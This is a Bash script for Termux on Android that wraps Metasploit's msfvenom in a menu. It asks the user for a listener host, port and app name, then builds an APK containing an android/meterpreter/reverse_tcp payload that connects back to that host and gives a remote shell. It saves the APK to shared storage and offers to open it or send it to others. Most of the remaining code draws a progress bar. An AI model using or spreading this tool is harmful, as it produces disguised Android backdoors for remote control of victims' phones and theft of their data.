#!/usr/bin/bash

c1=$'\e[0;1;38;2;0;230;118m'
c2=$'\e[0;38;2;50;60;70m'
c3=$'\e[0m'
slp=$'sleep 0.03'

PUT(){ echo -en "\033[${1};${2}H";}
HIDE(){ echo -en "\033[?25l";}
NORM(){ echo -en "\033[?12l\033[?25h";}

if [ ! -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then
echo
echo -e '\033[1;91m[!] You have to install "Metasploit-framework" ; then you can use it."\033[0m'
echo
printf "[?] Are you want to install Metasploit-framework right Now [Y/n] ? "
read ask
if [[ $ask = "y" ]] || [[ ask = "Y" ]];then
bash install.sh
else echo "abort."
exit
fi
fi

command -v tput > /dev/null 2>&1 || { echo -ne "\e[0m[⬇] Installing Requirements... \r"; apt install ncurses-utils &> /dev/null ; connection="$(ping -c 1 -q www.google.com >&/dev/null; echo $?)"
if [[ "$connection" != 0 ]]
then clear
echo -e "\033[1;91m[\033[1;92m-\033[1;91m] No Internet\033[1;92m connection!"
   exit
fi; }

if [ -d "/data/data/com.termux/files/usr/opt/metasploit-framework" ]; then

let_do() {
echo -ne "                                                \r"
NORM
}

#banner
clear
echo -e "\e[1;3$(( $RANDOM * 6 / 32767 + 1 ))m
┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                   ┃
┃  █▀▄▀█ █▀ █ █ █▀▀ █▄ █ █▀█ █▀▄▀█  ┃
┃  █ ▀ █ ▄█ ▀▄▀ ██▄ █ ▀█ █▄█ █ ▀ █  ┃
┃                                   ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
\e[0m"

echo -e '\033[1;92m[#] Choose your LHOST'
read -p 'msvenom > ' lhost
if [ ${#lhost} -lt 1 ]; then
echo "Input couldn't find..."
exit 0
fi
echo -e "[*] Create LHOST : ${lhost}"
echo
echo -e '\033[1;92m[#] Choose your LPORT'
read -p 'msvenom > ' lport
if [ ${#lport} -lt 1 ]; then
echo "Input couldn't find..."
exit 0
fi
echo -e "[*] Create LPORT : ${lport}"
echo
echo -e '\033[1;92m[#] Choose your App Name'
read -p 'msvenom > ' app
if [ ${#app} -lt 1 ]; then
echo "Input couldn't find..."
exit 0
fi
echo -e "[*] Create APK : ${app}.apk"

cd /sdcard
ls &> /dev/null
if [ $? -eq 0 ]; then
cd - &> /dev/null
else
if [ ! -d "/data/data/com.termux/files/home/storage" ];then
HIDE
termux-setup-storage
sleep 5
cd - &> /dev/null
NORM
fi
fi

if [ -f "/sdcard/${app}.apk" ];then
cd /sdcard
rm "${app}.apk"
fi

echo;HIDE
function payload() {
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > /data/data/com.termux/files/usr/tmp/$app.apk
cd /data/data/com.termux/files/usr/tmp
mv $app.apk /sdcard ;}

printf "${c1}Creating Payload wait...                   \r"
sleep 1.2

function progress_bar() {
while true ;do
if [ -f "/sdcard/${app}.apk" ];then
let_do
break
fi
$slp
echo -ne "${c2}━━━━━━━━━━━━━━━━━━━━━━━━${c3}             \r"
$slp
echo -ne "${c1}━${c2}━━━━━━━━━━━━━━━━━━━━━━━${c3}        \r"
$slp
echo -ne "${c1}━━${c2}━━━━━━━━━━━━━━━━━━━━━━${c3}        \r"
$slp
echo -ne "${c1}━━━${c2}━━━━━━━━━━━━━━━━━━━━━${c3}        \r"
$slp
echo -ne "${c1}━━━━${c2}━━━━━━━━━━━━━━━━━━━━${c3}        \r"
$slp
echo -ne "${c1}━━━━━${c2}━━━━━━━━━━━━━━━━━━━${c3}        \r"
$slp
echo -ne "${c1}━━━━━━${c2}━━━━━━━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━${c2}━━━━━━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━${c2}━━━━━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━${c2}━━━━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━${c2}━━━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━${c2}━━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━${c2}━━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━${c2}━━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━${c2}━━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━${c2}━━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━${c2}━━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━${c2}━━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━━${c2}━━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━━━${c2}━━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━━━━${c2}━━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━━━━━${c2}━━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━━━━━━${c2}━━${c3}         \r"
$slp
echo -ne "${c1}━━━━━━━━━━━━━━━━━━━━━━━${c2}━${c3}         \r"
$slp
if [ -f "/sdcard/${app}.apk" ];then
let_do
break
fi
done
}

trap '' SIGTSTP
trap '' SIGINT
payload & progress_bar

echo -e "\e[0m[+] Payload Saved to : emulated/0/${app}.apk"
echo
echo -e "\e[0m==> Open: [O/o] :: Delete: [D/d] :: Send: [S/s] :: Payload: ${app}.apk"
echo
printf '\033[1;92m[?] What do you want to Do with Payload ? '
read ask
if [[ $ask = "o" ]] || [[ $ask = "O" ]]
        then cd /sdcard && xdg-open $app.apk
elif [[ $ask = "s" ]] || [[ $ask = "S" ]]
        then cd /sdcard && xdg-open --send $app.apk
elif [[ $ask = "d" ]] || [[ $ask = "D" ]]
        then cd /sdcard && rm $app.apk
echo -e "\e[1;92m[\e[0m-\e[1;92m] ${app}.apk Deleted."
echo
exit
else echo 'Abort.'
echo
fi
fi
